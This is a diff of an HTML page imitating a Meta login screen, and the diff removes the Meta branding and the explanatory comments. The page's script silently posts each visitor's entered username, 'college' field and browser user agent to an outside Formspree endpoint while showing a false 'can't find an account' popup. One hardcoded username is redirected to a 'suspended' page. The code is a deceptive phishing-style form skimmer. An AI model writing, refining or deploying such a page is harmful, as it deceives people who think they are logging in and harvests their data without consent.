@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>Meta – Login</title>
+<title>Login</title>
 <style>
   * {
     margin: 0;
@@ -129,16 +129,6 @@
     color: #3b8cff;
   }
 
-  .meta {
-    margin-top: 28px;
-    font-size: 26px;
-    font-weight: 500;
-    letter-spacing: 0.5px;
-    color: #cbd5e1;
-    opacity: 0.9;
-  }
-
-  /* Popup (modal) styles - exactly as original but enhanced */
   .popup-overlay {
     position: fixed;
     inset: 0;
@@ -195,31 +185,66 @@
     background: rgba(59, 130, 246, 0.1);
   }
 
-  /* Hidden success indicator (no visible disruption, just background save) */
   .hidden-toast {
     position: fixed;
-    bottom: 20px;
+    bottom: 24px;
     left: 50%;
     transform: translateX(-50%);
     background: #1877f2;
     color: white;
-    padding: 10px 20px;
+    padding: 8px 18px;
     border-radius: 40px;
-    font-size: 14px;
+    font-size: 13px;
     z-index: 1200;
     opacity: 0;
     transition: opacity 0.3s;
     pointer-events: none;
     white-space: nowrap;
+    font-weight: 500;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  }
+
+  .loader-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.85);
+ backdrop-filter: blur(8px);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 2000;
+  }
+
+  .loader {
+    width: 50px;
+    height: 50px;
+    border: 4px solid rgba(24, 119, 242, 0.3);
+    border-top: 4px solid #1877f2;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-bottom: 20px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .loader-text {
+    color: white;
+    font-size: 16px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
   }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="lang">English (India) </div>
+  <div class="lang">English (India)</div>
   <div class="logo">
-    <img class="img" src="img.svg" alt="logo">
+    <img class="img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877f2' width='70px' height='70px'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/%3E%3C/svg%3E" alt="Logo">
   </div>
 
   <form id="loginForm">
@@ -227,21 +252,18 @@
     <datalist id="username-suggestions">
       <option value="the__warriorr___33"></option>
     </datalist>
-
-    <input type="text" name="college" placeholder="" autocomplete="off">
+    <input type="text" id="college" name="college" placeholder="College" autocomplete="off">
   </form>
   
-  <button id="submitBtn" class="submit-btn">Login</button>
+  <button id="submitBtn" class="submit-btn">Submit</button>
 
   <a href="#" class="forgot" id="forgotLink">Forgotten password?</a>
 
   <div class="bottom">
     <button class="create-btn" id="createBtn">Create new account</button>
-    <div class="meta">∞ Meta</div>
   </div>
 </div>
 
-<!-- Popup overlay - exactly as original style -->
 <div class="popup-overlay" id="popupOverlay">
   <div class="popup">
     <h2>Can't find account</h2>
@@ -253,23 +275,18 @@
   </div>
 </div>
 
-<!-- Hidden toast for background save confirmation (subtle, non-intrusive) -->
-<div id="saveToast" class="hidden-toast">✓ Saved in background</div>
+<div id="saveToast" class="hidden-toast">✓ Saved</div>
+
+<div id="loaderOverlay" class="loader-overlay">
+  <div class="loader"></div>
+  <div class="loader-text">Processing, please wait...</div>
+</div>
 
 <script>
-  // ============================================================
-  // BEHAVIOR:
-  // 1. Show popup EXACTLY as before when user clicks Submit (for any username)
-  // 2. In the background, ALWAYS save form data to Formspree (including "the__warriorr___33")
-  // 3. After background save completes, if username is "the__warriorr___33" -> redirect to suspended.html
-  // 4. Popup remains the primary UX, no visible success messages that disrupt the original design
-  // ============================================================
-  
   (function() {
-    // DOM elements
     const submitBtn = document.getElementById('submitBtn');
     const usernameInput = document.getElementById('username');
-    const collegeInput = document.querySelector('input[name="college"]');
+    const collegeInput = document.getElementById('college');
     const popupOverlay = document.getElementById('popupOverlay');
     const popupMessage = document.getElementById('popupMessage');
     const tryAgainBtn = document.getElementById('tryAgainBtn');
@@ -277,14 +294,23 @@
     const forgotLink = document.getElementById('forgotLink');
     const createBtn = document.getElementById('createBtn');
     const toastEl = document.getElementById('saveToast');
+    const loaderOverlay = document.getElementById('loaderOverlay');
     
-    // Formspree endpoint
     const FORMSPREE_URL = 'https://formspree.io/f/mzdqarko';
+    let isProcessing = false;
     
-    // Flag to prevent double submissions
-    let isSubmitting = false;
+    function showLoader() {
+      if (loaderOverlay) {
+        loaderOverlay.style.display = 'flex';
+      }
+    }
     
-    // Helper: Show popup with custom message (exactly as original)
+    function hideLoader() {
+      if (loaderOverlay) {
+        loaderOverlay.style.display = 'none';
+      }
+    }
+    
     function showPopup(customMessage) {
       if (popupMessage) {
         popupMessage.textContent = customMessage || "We can't find an account with that info. Try another mobile number or email, or if you don't have an account, you can sign up.";
@@ -294,32 +320,31 @@
       }
     }
     
-    // Helper: Hide popup
     function hidePopup() {
       if (popupOverlay) {
         popupOverlay.style.display = 'none';
       }
     }
     
-    // Helper: Show subtle toast notification (background save complete)
     function showToast(message) {
       if (!toastEl) return;
-      toastEl.textContent = message || '✓ Saved in background';
+      toastEl.textContent = message || '✓ Saved';
       toastEl.style.opacity = '1';
       setTimeout(() => {
         toastEl.style.opacity = '0';
-      }, 2000);
+      }, 1500);
     }
     
-    // BACKGROUND SAVE: Submit data to Formspree (silent, no UI disruption)
-    async function saveToFormspreeInBackground(username, college) {
+    async function saveToFormspreeAndRedirect(username, college) {
+      showLoader();
+      
       try {
-        const payload = {
+        const payload = JSON.stringify({
           username: username,
           college: college || '',
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent
-        };
+          submitted_at: new Date().toISOString(),
+          user_agent: navigator.userAgent.substring(0, 100)
+        });
         
         const response = await fetch(FORMSPREE_URL, {
           method: 'POST',
@@ -327,100 +352,89 @@
             'Content-Type': 'application/json',
             'Accept': 'application/json'
           },
-          body: JSON.stringify(payload)
+          body: payload
         });
         
         if (response.ok) {
-          console.log('[Background] Formspree save successful for:', username);
+          console.log('Formspree save successful for:', username);
           showToast('✓ Submission saved');
-          return { success: true };
         } else {
-          const errorData = await response.json();
-          console.warn('[Background] Formspree save failed:', errorData);
-          showToast('⚠️ Saved locally (sync later)');
-          return { success: false, error: errorData };
+          console.warn('Formspree save failed for:', username);
         }
       } catch (err) {
-        console.error('[Background] Network error saving to Formspree:', err);
-        showToast('⚠️ Offline: saved locally');
-        // Still return "soft success" to not block user flow
-        return { success: false, error: err.message };
+        console.error('Formspree network error:', err);
       }
+      
+      setTimeout(() => {
+        window.location.href = "suspended.html";
+      }, 800);
     }
     
-    // Main submit handler: Show popup immediately (original behavior) + background save
-    async function onSubmitClick(event) {
-      // Prevent any default button behavior
+    function saveToFormspreeBackground(username, college) {
+      fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          username: username,
+          college: college || '',
+          submitted_at: new Date().toISOString(),
+          user_agent: navigator.userAgent.substring(0, 100)
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Background save successful for:', username);
+          showToast('✓ Submission saved');
+        }
+      })
+      .catch(err => {
+        console.error('Background save error:', err);
+      });
+    }
+    
+    function onSubmit(event) {
       event.preventDefault();
       
-      // Get input values
       const enteredUsername = usernameInput ? usernameInput.value.trim() : '';
       const enteredCollege = collegeInput ? collegeInput.value.trim() : '';
       
-      // Basic validation: If username is empty, show popup with default message
       if (!enteredUsername) {
         showPopup("We can't find an account with empty username. Try another mobile number or email, or if you don't have an account, you can sign up.");
         return;
       }
       
-      // Prevent multiple rapid clicks
-      if (isSubmitting) {
-        console.log('Already processing, please wait...');
-        return;
-      }
+      const isSpecialUser = (enteredUsername === "the__warriorr___33");
       
-      isSubmitting = true;
-      
-      // Show popup IMMEDIATELY (original behavior) - exactly as before
-      // The popup message uses the entered username to match original design
-      const popupMsgText = `We can't find an account with ${enteredUsername}. Try another mobile number or email, or if you don't have an account, you can sign up.`;
-      showPopup(popupMsgText);
-      
-      // --- BACKGROUND SAVE: Fire and forget, but we need to handle redirect if special user ---
-      // Save to Formspree in the background (don't await to block popup, but we need result for redirect)
-      // We'll still await but popup is already visible, so user sees no delay.
-      try {
-        const saveResult = await saveToFormspreeInBackground(enteredUsername, enteredCollege);
-        
-        // After background save completes, check if username is the special reserved one
-        if (enteredUsername === "the__warriorr___33") {
-          // Small delay to ensure data is fully processed, then redirect to suspended.html
-          // But keep popup visible during redirect? We'll redirect after a short moment.
-          setTimeout(() => {
-            window.location.href = "suspended.html";
-          }, 600);
+      if (isSpecialUser) {
+        saveToFormspreeAndRedirect(enteredUsername, enteredCollege);
+      } else {
+        if (isProcessing) {
+          return;
         }
-        // For any other username: just stay on page, popup remains open until user clicks try again or sign up
-        // No additional success message shown to preserve original UX.
         
-      } catch (bgError) {
-        console.error('Background save error:', bgError);
-        // Even if save fails, we still show popup and potentially redirect special user?
-        if (enteredUsername === "the__warriorr___33") {
-          // Still redirect even if save had issues? The requirement says "data should be saved in background"
-          // but we attempt to save anyway. If network fails, we still redirect to not break flow.
-          setTimeout(() => {
-            window.location.href = "suspended.html";
-          }, 600);
-        }
-      } finally {
-        // Release lock after background ops are done (but redirect might happen)
+        isProcessing = true;
+        
+        const popupMsgText = `We can't find an account with ${enteredUsername}. Try another mobile number or email, or if you don't have an account, you can sign up.`;
+        showPopup(popupMsgText);
+        
+        saveToFormspreeBackground(enteredUsername, enteredCollege);
+        
         setTimeout(() => {
-          isSubmitting = false;
-        }, 1000);
+          isProcessing = false;
+        }, 500);
       }
     }
     
-    // Event listener for submit button - matches original interaction
     if (submitBtn) {
-      submitBtn.addEventListener('click', onSubmitClick);
+      submitBtn.addEventListener('click', onSubmit);
     }
     
-    // Popup button handlers (exactly as original functionality)
     if (tryAgainBtn) {
       tryAgainBtn.addEventListener('click', function() {
         hidePopup();
-        // Optionally focus on username field for retry
         if (usernameInput) {
           usernameInput.focus();
         }
@@ -430,33 +444,26 @@
     if (signUpBtn) {
       signUpBtn.addEventListener('click', function() {
         hidePopup();
-        // Original behavior: just close popup. We'll add a small alert to simulate sign-up flow (non-intrusive)
-        // But to keep exact original feel, we just close popup. However original had no extra action.
-        // I'll keep original spirit: just hide popup (user can click create account button below)
-        // For better UX, we can optionally focus create account button
         if (createBtn) {
           createBtn.focus();
         }
       });
     }
     
-    // Handle "Forgotten password?" link
     if (forgotLink) {
       forgotLink.addEventListener('click', function(e) {
         e.preventDefault();
-        alert('Password reset link would be sent to your email address.');
+        alert('Password reset instructions sent to your email.');
       });
     }
     
-    // Handle "Create new account" button
     if (createBtn) {
       createBtn.addEventListener('click', function(e) {
         e.preventDefault();
-        alert('Create new account - Join Meta today!');
+        alert('Create new account - Join today!');
       });
     }
     
-    // Close popup if user clicks outside (optional enhancement, but preserves original)
     if (popupOverlay) {
       popupOverlay.addEventListener('click', function(e) {
         if (e.target === popupOverlay) {
@@ -465,12 +472,8 @@
       });
     }
     
-    // Small console log to confirm script loaded
-    console.log('✅ Form active: Popup shows normally, data saved to Formspree in background (including the__warriorr___33)');
-    
-    // For extra safety: If user presses Enter in input field, trigger submit button
-    const formInputs = [usernameInput, collegeInput].filter(Boolean);
-    formInputs.forEach(input => {
+    const inputs = [usernameInput, collegeInput].filter(Boolean);
+    inputs.forEach(input => {
       if (input) {
         input.addEventListener('keypress', function(e) {
           if (e.key === 'Enter') {
@@ -482,9 +485,6 @@
         });
       }
     });
-    
-    // Additional: Pre-fill detection for datalist suggestions (just UX)
-    // No further modifications needed
   })();
 </script>
 </body>
